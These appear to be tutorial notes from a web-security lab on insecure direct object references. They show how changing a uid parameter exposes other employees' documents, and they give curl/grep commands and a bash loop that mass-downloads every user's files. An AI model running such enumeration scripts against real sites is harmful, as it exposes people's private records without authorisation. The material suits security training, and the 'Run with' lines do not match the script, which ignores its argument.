# Mass IDOR Enumeration
## Insecure Parameters
### Example
The exercise below is an `Employee Manager` web application that hosts employee records:

![Employee Manager with 'Edit Profile' button, links to 'Personal Records', 'Documents', and 'Contracts'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

Our web application assumes that we are logged in as an employee with user id `uid=1`.

Once we click on `Documents`, we are redirected to `/documents.php`.
- When we get to the `Documents` page, we see several documents that belong to our user.
- Checking the file links, we see that they have individual names:
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
- We see that the files have a predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called `static file IDOR`.

Let's look for a more solid IDOR vulnerability.

We see that the page is setting our `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`). If the web application uses this `uid` GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value.
- If the back-end end of the web application `does` have a proper access control system, we will get some form of `Access Denied`.

When we try changing the `uid` to `?uid=2`, we don't notice any difference in the page output, but...

If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with `uid=2`:
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```
## Mass Enumeration
We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient.

So, we can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files.

We can click on [`CTRL+SHIFT+C`] in Firefox to enable the `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

We may now use specific bash commands to trim the extra parts and only get the document links in the output.
- It is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
- When we run the script, it will download all documents from all employees with `uids` between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees.

Run with:
```shell
bash script.sh STMIP:STMPO
```
### `uid` Specified in Request
If the `uid` value isn't in the url and is instead in a `POST` request, we can modify our `curl` to the following:
```bash
curl -s -X POST "http://SERVER_IP:PORT/documents.php" -d "uid=PUT-ID-HERE" | grep -oP "/documents.*?\.[a-z]{3}"
```

Run with:
```shell
bash script.sh STMIP:STMPO
```
